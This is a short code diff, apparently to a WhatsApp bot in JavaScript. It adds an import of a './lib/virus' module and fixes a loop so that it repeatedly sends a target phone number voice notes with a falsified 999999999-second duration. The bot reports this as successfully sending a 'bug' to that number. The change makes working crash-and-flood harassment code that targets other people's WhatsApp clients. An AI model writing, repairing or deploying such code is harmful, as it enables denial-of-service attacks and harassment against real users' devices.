@@ -45,6 +45,7 @@ const audionye = fs.readFileSync('./y.mp3')
 const { ngazap } = require('./lib/ngazap')
 const { santedpc } = require('./lib/santedpc')
 const { buttonvirus2 } = require('./lib/buttonvirus2')
+const { virus } = require('./lib/virus')
 
 //read database\\
 
@@ -710,7 +711,7 @@ if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+comman
 num = q.split('.')[0]
 jumlah = q.split('.')[1]
 for (let i = 0; i < jumlah; i++) {
-XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
+XeonBotInc.sendMessage(`${num}@s.whatsapp.net`, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
